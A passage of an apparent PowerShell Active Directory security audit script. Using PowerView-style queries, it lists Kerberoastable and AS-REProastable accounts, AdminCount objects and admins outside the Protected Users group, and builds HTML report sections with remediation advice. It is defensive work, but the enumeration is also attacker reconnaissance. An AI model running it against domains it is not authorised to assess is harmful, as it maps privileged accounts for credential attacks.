			foreach ($Account in $ServiceAccounts) {
				[PSCustomObject]@{
					"Account" = $Account.samaccountname
					"Enabled" = if ($Account.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Account.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $Account.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($Account.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($Account.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($Account.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $Account.lastlogontimestamp
					"SID" = $Account.objectSID
					"Domain" = $AllDomain
					#"Groups Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $Account.samaccountname).Name -join ' - '
				}
			}
		}
	}

 	if ($TempServiceAccounts) {
		$TempServiceAccounts | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLServiceAccounts = $TempServiceAccounts | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Service Accounts (Kerberoastable)</h2>"
		$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLServiceAccounts = $HTMLServiceAccounts -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$ServiceAccountsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the need for these service accounts, review their membership in high privileged groups, and implement a strong password policy."
		}
		
		$HTMLServiceAccountsTable = $ServiceAccountsTable | ConvertTo-Html -As List -Fragment
  		$HTMLServiceAccountsTable = $HTMLServiceAccountsTable.Replace("*", "Recommendations")
	}
	
	##########################################################
    ########### Group Managed Service Accounts ###############
	##########################################################
    
    Write-Host ""
	Write-Host "Group Managed Service Accounts (GMSA):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$GMSAs = Get-DomainObject -Domain $Domain -Server $Server -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
		$TempGMSAs = foreach ($GMSA in $GMSAs) {
			[PSCustomObject]@{
				"Account" = $GMSA.samaccountname
				"Enabled" = if ($GMSA.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($GMSA.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($GMSA.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($GMSA.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($GMSA.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Account Type" = $GMSA.samaccounttype
				"Pwd Interval" = $GMSA."msds-managedpasswordinterval"
				"Pwd Last Set" = $GMSA.pwdlastset
				"SID" = $GMSA.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempGMSAs = foreach ($AllDomain in $AllDomains) {
			$GMSAs = Get-DomainObject -Domain $AllDomain -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
			foreach ($GMSA in $GMSAs) {
				[PSCustomObject]@{
					"Account" = $GMSA.samaccountname
					"Enabled" = if ($GMSA.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($GMSA.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $GMSA.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($GMSA.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($GMSA.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($GMSA.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Account Type" = $GMSA.samaccounttype
					"Pwd Interval" = $GMSA."msds-managedpasswordinterval"
					"Pwd Last Set" = $GMSA.pwdlastset
					"SID" = $GMSA.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempGMSAs) {
		$TempGMSAs | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLGMSAs = $TempGMSAs | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Group Managed Service Accounts (GMSA)</h2>"
		$HTMLGMSAs = $HTMLGMSAs -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLGMSAs = $HTMLGMSAs -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLGMSAs = $HTMLGMSAs -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLGMSAs = $HTMLGMSAs -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$GMSAServiceAccountsTable = [PSCustomObject]@{
			"Recommendations" = "Evaluate the need for these service accounts and review their membership in high privileged groups."
		}
		
		$HTMLGMSAServiceAccountsTable = $GMSAServiceAccountsTable | ConvertTo-Html -As List -Fragment
  		$HTMLGMSAServiceAccountsTable = $HTMLGMSAServiceAccountsTable.Replace("*", "Recommendations")
	}

 	################################################
    ########### No preauthentication ###############
	################################################
    
    Write-Host ""
	Write-Host "Users without kerberos preauthentication set (AS-REProastable):" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$nopreauthsetUsers = Get-DomainUser -Domain $Domain -Server $Server -PreauthNotRequired
		$Tempnopreauthset = foreach ($User in $nopreauthsetUsers) {
			[PSCustomObject]@{
				"User Name" = $User.samaccountname
				"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $User.lastlogontimestamp
				"SID" = $User.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$Tempnopreauthset = foreach ($AllDomain in $AllDomains) {
			$nopreauthsetUsers = Get-DomainUser -Domain $AllDomain -PreauthNotRequired
			foreach ($User in $nopreauthsetUsers) {
				[PSCustomObject]@{
					"User Name" = $User.samaccountname
					"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $User.lastlogontimestamp
					"SID" = $User.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($Tempnopreauthset) {
		$Tempnopreauthset | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
		$HTMLnopreauthset = $Tempnopreauthset | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users without kerberos preauthentication set (AS-REProastable)</h2>"
  		$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>YES</td>','<td class="YesStatus">YES</td>'
		$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>NO</td>','<td class="NoStatus">NO</td>'
		#$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>False</td>','<td class="YesStatus">False</td>'
		#$HTMLnopreauthset = $HTMLnopreauthset -replace '<td>True</td>','<td class="NoStatus">True</td>'

  		$NoPreauthenticationTable = [PSCustomObject]@{
			"Recommendations" = "Enable pre-authentication for the identified user accounts, review their membership in high privileged groups, and implement a strong password policy. "
		}
		
		$HTMLNoPreauthenticationTable = $NoPreauthenticationTable | ConvertTo-Html -As List -Fragment
  		$HTMLNoPreauthenticationTable = $HTMLNoPreauthenticationTable.Replace("*", "Recommendations")
	}

	##################################################
    ########### Admin Count (Users) ##################
	##################################################
	
	Write-Host ""
    Write-Host "Users with AdminCount set to 1 (non-defaults):" -ForegroundColor Cyan
	
	$excludedUsers = @(
    'krbtgt'
    )
	
	$excludedGroups = @(
    'Administrators',
    'Print Operators',
    'Backup Operators',
    'Replicator',
    'krbtgt',
    'Domain Controllers',
    'Schema Admins',
    'Enterprise Admins',
    'Domain Admins',
    'Server Operators',
    'Account Operators',
    'Read-only Domain Controllers',
    'Key Admins',
    'Enterprise Key Admins'
    )
	
    if ($Domain -and $Server) {
		$excludedGroupsIdentities = foreach($excludedGroup in $excludedGroups){Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $excludedGroup | Select-Object -ExpandProperty MemberName | Sort-Object -Unique}
		$UsersAdminCount = Get-DomainUser -Domain $Domain -Server $Server -AdminCount | Where-Object { $_.samaccountname -notin $excludedUsers -AND $_.samaccountname -notin $excludedGroupsIdentities }
		$TempUsersAdminCount = foreach ($User in $UsersAdminCount) {
			[PSCustomObject]@{
				"User Name" = $User.samaccountname
				"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $User.lastlogontimestamp
				"SID" = $User.objectSID
				"Domain" = $Domain
				#"Group Membership" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $User.samaccountname).Name -join ' - '
			}
		}
	}
	
	else {
		$TempUsersAdminCount = foreach ($AllDomain in $AllDomains) {
			$excludedGroupsIdentities = foreach($excludedGroup in $excludedGroups){Get-DomainGroupMember -Domain $AllDomain -Identity $excludedGroup | Select-Object -ExpandProperty MemberName | Sort-Object -Unique}
			$UsersAdminCount = Get-DomainUser -Domain $AllDomain -AdminCount | Where-Object { $_.samaccountname -notin $excludedUsers -AND $_.samaccountname -notin $excludedGroupsIdentities }
			foreach ($User in $UsersAdminCount) {
				[PSCustomObject]@{
					"User Name" = $User.samaccountname
					"Enabled" = if ($User.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($User.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $User.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($User.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($User.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($User.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $User.lastlogontimestamp
					"SID" = $User.objectSID
					"Domain" = $AllDomain
					#"Group Membership" = (Get-DomainGroup -Domain $AllDomain -UserName $User.samaccountname).Name -join ' - '
				}
			}
		}
	}

 	if ($TempUsersAdminCount) {
		$TempUsersAdminCount | Sort-Object Domain,"User Name" | Format-Table -AutoSize -Wrap
		$HTMLUsersAdminCount = $TempUsersAdminCount | Sort-Object Domain,"User Name" | ConvertTo-Html -Fragment -PreContent "<h2>Users with AdminCount set to 1 (non-defaults)</h2>"

  		$AdminCountUsersTable = [PSCustomObject]@{
			"Description" = "The Users listed below have the attribute 'AdminCount' set to 1. When an object is removed from one of the privileged groups, AdminCount is not set to another value."
			"Remediation" = "In alignment with the principle of least privilege, evaluate the necessity of administrative privileges and consider removing the AdminCount attribute for the affected users."
		}
		
		$HTMLAdminCountUsersTable = $AdminCountUsersTable | ConvertTo-Html -As List -Fragment
	}

	
	##################################################
    ########### Admin Count (Groups) #################
	##################################################
	
	Write-Host ""
    Write-Host "Groups with AdminCount set to 1 (non-defaults):" -ForegroundColor Cyan
	
	$excludedGroups = @(
    'Administrator',
    'Administrators',
    'Print Operators',
    'Backup Operators',
    'Replicator',
    'krbtgt',
    'Domain Controllers',
    'Schema Admins',
    'Enterprise Admins',
    'Domain Admins',
    'Server Operators',
    'Account Operators',
    'Read-only Domain Controllers',
    'Key Admins',
    'Enterprise Key Admins'
    )
	
    if ($Domain -and $Server) {
		$GroupsAdminCount = Get-DomainGroup -Domain $Domain -Server $Server -AdminCount | Where-Object { $_.samaccountname -notin $excludedGroups }
		$TempGroupsAdminCount = foreach ($Group in $GroupsAdminCount) {
			[PSCustomObject]@{
				"Group Name" = $Group.samaccountname
				"Group SID" = $Group.objectsid
				"Domain" = $Domain
				#"Members" = (Get-DomainGroupMember -Domain $Domain -Server $Server -Identity $Group.samaccountname -Recurse | Select-Object -ExpandProperty MemberName) -join ' - '
			}
		}
	}
	
	else {
		$TempGroupsAdminCount = foreach ($AllDomain in $AllDomains) {
			$GroupsAdminCount = Get-DomainGroup -Domain $AllDomain -AdminCount | Where-Object { $_.samaccountname -notin $excludedGroups }
			foreach ($Group in $GroupsAdminCount) {
				[PSCustomObject]@{
					"Group Name" = $Group.samaccountname
					"Group SID" = $Group.objectsid
					"Domain" = $AllDomain
					#"Members" = (Get-DomainGroupMember -Domain $AllDomain -Identity $Group.samaccountname -Recurse | Select-Object -ExpandProperty MemberName) -join ' - '
				}
			}
		}
	}

 	if ($TempGroupsAdminCount) {
		$TempGroupsAdminCount | Sort-Object Domain,"Group Name" | Format-Table -AutoSize -Wrap
		$HTMLGroupsAdminCount = $TempGroupsAdminCount | Sort-Object Domain,"Group Name" | ConvertTo-Html -Fragment -PreContent "<h2>Groups with AdminCount set to 1 (non-defaults)</h2>"

  		$AdminCountGroupsTable = [PSCustomObject]@{
			"Description" = "The Groups listed below have the attribute 'AdminCount' set to 1. When an object is removed from one of the privileged groups, AdminCount is not set to another value."
			"Remediation" = "In alignment with the principle of least privilege, evaluate the necessity of administrative privileges and consider removing the AdminCount attribute for the affected Groups."
		}
		
		$HTMLAdminCountGroupsTable = $AdminCountGroupsTable | ConvertTo-Html -As List -Fragment
	}
	
	##################################################################
    ########### Admin users in "Protected Users" group ###############
	##################################################################
	
	Write-Host ""
	Write-Host "Admin Users in 'Protected Users' group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$ProtectedUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(&(AdminCount=1)(memberof=CN=Protected Users,CN=Users,$dcName))"
		$TempAdminsInProtectedUsersGroup = foreach ($ProtectedUser in $ProtectedUsers) {
			[PSCustomObject]@{
				"Account" = $ProtectedUser.samaccountname
				"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $ProtectedUser.lastlogontimestamp
				"SID" = $ProtectedUser.objectSID
				"Domain" = $Domain
			}
		}

	}
	
	else {
		$TempAdminsInProtectedUsersGroup = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$ProtectedUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter "(&(AdminCount=1)(memberof=CN=Protected Users,CN=Users,$dcName))"
			foreach ($ProtectedUser in $ProtectedUsers) {
				[PSCustomObject]@{
					"Account" = $ProtectedUser.samaccountname
					"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ProtectedUser.lastlogontimestamp
					"SID" = $ProtectedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

	}

	if ($TempAdminsInProtectedUsersGroup) {
		$TempAdminsInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLAdminsInProtectedUsersGroup = $TempAdminsInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Admin Users in 'Protected Users' Group</h2>"
	}

 	###############################################################################################################################
    ########### Admin users in "Protected Users" group but NOT marked as "sensitive and not allowed for delegation" ###############
	###############################################################################################################################
	
	Write-Host ""
	Write-Host "Admin Users in 'Protected Users' group but NOT marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$ProtectedNotSensitiveUsers = Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -LDAPFilter "(&(AdminCount=1)(memberof=CN=Protected Users,CN=Users,$dcName))"
		$TempNotSensitiveAdminsInProtectedUsersGroup = foreach ($ProtectedNotSensitiveUser in $ProtectedNotSensitiveUsers) {
			[PSCustomObject]@{
				"Account" = $ProtectedNotSensitiveUser.samaccountname
				"Enabled" = if ($ProtectedNotSensitiveUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ProtectedNotSensitiveUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($ProtectedNotSensitiveUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($ProtectedNotSensitiveUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($ProtectedNotSensitiveUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $ProtectedNotSensitiveUser.lastlogontimestamp
				"SID" = $ProtectedNotSensitiveUser.objectSID
				"Domain" = $Domain
			}
		}

	}
	
	else {
		$TempNotSensitiveAdminsInProtectedUsersGroup = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$ProtectedNotSensitiveUsers = Get-DomainUser -Domain $AllDomain -AllowDelegation -LDAPFilter "(&(AdminCount=1)(memberof=CN=Protected Users,CN=Users,$dcName))"
			foreach ($ProtectedNotSensitiveUser in $ProtectedNotSensitiveUsers) {
				[PSCustomObject]@{
					"Account" = $ProtectedNotSensitiveUser.samaccountname
					"Enabled" = if ($ProtectedNotSensitiveUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ProtectedNotSensitiveUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($ProtectedNotSensitiveUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($ProtectedNotSensitiveUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($ProtectedNotSensitiveUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ProtectedNotSensitiveUser.lastlogontimestamp
					"SID" = $ProtectedNotSensitiveUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}

	}
	
	if ($TempNotSensitiveAdminsInProtectedUsersGroup) {
		$TempNotSensitiveAdminsInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLNotSensitiveAdminsInProtectedUsersGroup = $TempNotSensitiveAdminsInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Admin Users in 'Protected Users' Group but NOT marked as 'sensitive and not allowed for delegation'</h2>"
	}
 
	######################################################################
    ########### Admin users NOT in "Protected Users" group ###############
	######################################################################
	
	Write-Host ""
	Write-Host "Admin Users NOT in 'Protected Users' group:" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$ProtectedUsers = Get-DomainUser -Domain $Domain -Server $Server -LDAPFilter "(&(AdminCount=1)(!(memberof=CN=Protected Users,CN=Users,$dcName)))"
		$TempAdminsNotInProtectedUsersGroup = foreach ($ProtectedUser in $ProtectedUsers) {
			[PSCustomObject]@{
				"Account" = $ProtectedUser.samaccountname
				"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
				#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
				#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
				"Last Logon" = $ProtectedUser.lastlogontimestamp
				"SID" = $ProtectedUser.objectSID
				"Domain" = $Domain
			}
		}
	}
	
	else {
		$TempAdminsNotInProtectedUsersGroup = foreach ($AllDomain in $AllDomains) {
			$dcName = "DC=" + $AllDomain.Split(".")
			$dcName = $dcName -replace " ", ",DC="
			$ProtectedUsers = Get-DomainUser -Domain $AllDomain -LDAPFilter "(&(AdminCount=1)(!(memberof=CN=Protected Users,CN=Users,$dcName)))"
			foreach ($ProtectedUser in $ProtectedUsers) {
				[PSCustomObject]@{
					"Account" = $ProtectedUser.samaccountname
					"Enabled" = if ($ProtectedUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ProtectedUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
     					"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $ProtectedUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					#"Adm" = if ($ProtectedUser.memberof -match 'Administrators') { "YES" } else { "NO" }
					#"DA" = if ($ProtectedUser.memberof -match 'Domain Admins') { "YES" } else { "NO" }
					#"EA" = if ($ProtectedUser.memberof -match 'Enterprise Admins') { "YES" } else { "NO" }
					"Last Logon" = $ProtectedUser.lastlogontimestamp
					"SID" = $ProtectedUser.objectSID
					"Domain" = $AllDomain
				}
			}
		}
	}

 	if ($TempAdminsNotInProtectedUsersGroup) {
		$TempAdminsNotInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | Format-Table -AutoSize -Wrap
		$HTMLAdminsNotInProtectedUsersGroup = $TempAdminsNotInProtectedUsersGroup | Where-Object {$_.Account -ne "krbtgt"} | Sort-Object Domain,Account | ConvertTo-Html -Fragment -PreContent "<h2>Admin Users NOT in 'Protected Users' Group</h2>"

  		$AdminsNOTinProtectedUsersGroupTable = [PSCustomObject]@{
			"Recommendations" = "Consider adding the identified Admin Users to the 'Protected Users' group, which offers enhanced security measures such as restrictions on NTLM Authentication and Delegation."
		}
		
		$HTMLAdminsNOTinProtectedUsersGroupTable = $AdminsNOTinProtectedUsersGroupTable | ConvertTo-Html -As List -Fragment
  		$HTMLAdminsNOTinProtectedUsersGroupTable = $HTMLAdminsNOTinProtectedUsersGroupTable.Replace("*", "Recommendations")
	}

 	#######################################################################################################################################
    ########### Admin users NOT in "Protected Users" group and NOT marked as "sensitive and not allowed for delegation" ###############
	###################################################################################################################################
	
	Write-Host ""
	Write-Host "Admin Users NOT in 'Protected Users' group and NOT marked as 'sensitive and not allowed for delegation':" -ForegroundColor Cyan
	if ($Domain -and $Server) {
		$dcName = "DC=" + $Domain.Split(".")
		$dcName = $dcName -replace " ", ",DC="
		$NotProtectedNotSensitiveUsers = Get-DomainUser -Domain $Domain -Server $Server -AllowDelegation -LDAPFilter "(&(AdminCount=1)(!(memberof=CN=Protected Users,CN=Users,$dcName)))"
		$TempAdminsNOTinProtectedUsersGroupAndNOTSensitive = foreach ($NotProtectedNotSensitiveUser in $NotProtectedNotSensitiveUsers) {
			[PSCustomObject]@{
				"Account" = $NotProtectedNotSensitiveUser.samaccountname
				"Enabled" = if ($NotProtectedNotSensitiveUser.useraccountcontrol -band 2) { "False" } else { "True" }
				"Active" = if ($NotProtectedNotSensitiveUser.lastlogontimestamp -ge $inactiveThreshold) { "True" } else { "False" }
    				"Adm" = if($TempBuiltInAdministrators."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"DA" = if($TempDomainAdmins."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
				"EA" = if($TempEnterpriseAdmins."Member Name" | Where-Object { $NotProtectedNotSensitiveUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
